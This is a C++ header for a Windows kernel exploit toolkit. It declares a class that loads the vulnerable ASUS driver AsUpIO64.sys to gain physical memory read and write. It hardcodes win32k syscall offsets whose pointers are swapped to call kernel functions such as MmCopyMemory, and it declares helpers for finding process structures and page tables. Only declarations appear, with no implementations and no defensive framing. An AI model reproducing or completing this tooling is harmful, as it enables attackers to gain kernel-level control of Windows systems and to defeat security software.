#pragma once
#include "Driver.h"
#include "Syscall.h"
#include "structs.h"
#include "status.h"
#include <psapi.h>


inline NtCall PointerOne("NtUserDrawCaptionTemp",0x65E28); // This needs to be specifically a function that gets sys called with the same or more parameters as mmcopymemory 
inline NtCall PointerTwo("NtUserSetPrecisionTouchPadConfiguration",0x66AD0); // these can be any unused nt function in win32k
inline NtCall PointerThree("NtUserGetPrecisionTouchPadConfiguration",0x67500); // these can be any unused nt function in win32k
class Kernel {
public:
    Kernel()
        : Asus("C:\\Windows\\System32\\drivers\\AsUpIO64.sys", "ASUSEXP"),
        bIsDriverLoaded(false),
        bIsExploitInit(false),
        DirTableBase(0),
        ExplorerDirectoryTable(0),
        ntoskrnlVirtual(0),
        ntoskrnlPhysical(0),
        win32kVirtual(0)
    { }

    NTSTATUS Initialize(bool Load);
    NTSTATUS Cleanup();

    bool ReadPhysical(__int64 PhysicalAddr, void* Buffer, int size);
    bool WritePhysical(__int64 PhysicalAddr, void* Buffer, int size);

    template<class T>
    T Read(__int64 PhysicalAddr);

    template<class T>
    void Write(__int64 PhysicalAddr, T Buffer);

    int ProcessId(const char* Name, int Index);
    __int64 EProcess(const char* Name, int Index);
    __int64 EProcess(int TargetProcessId);
    __int64 EThread(__int64 DirectoryTable, __int64 EProcess, int TargetThreadId);
    __int64 TranslateLinearAddress(__int64 directoryTableBase, __int64 virtualAddress);
    __int64 GetProcessDirectoryTable(__int64 EProcess);

private:
    bool bIsDriverLoaded;
    bool bIsExploitInit;
    __int64 DirTableBase;
    __int64 ExplorerDirectoryTable;
    __int64 ntoskrnlVirtual;
    __int64 ntoskrnlPhysical;
    __int64 win32kVirtual;

    __int64 ExportOffset(__int64 BaseAddress, const char* FunctionName);
    __int64 KernelExport(const char* FunctionName);
    __int64 BruteKernelDirectoryTable();
    void* GetKernelAddress(const char* Name);
    void SwapPointer(const char* FunctionName, __int64 Offset);

    Driver Asus;
    Syscall Exploit;
};

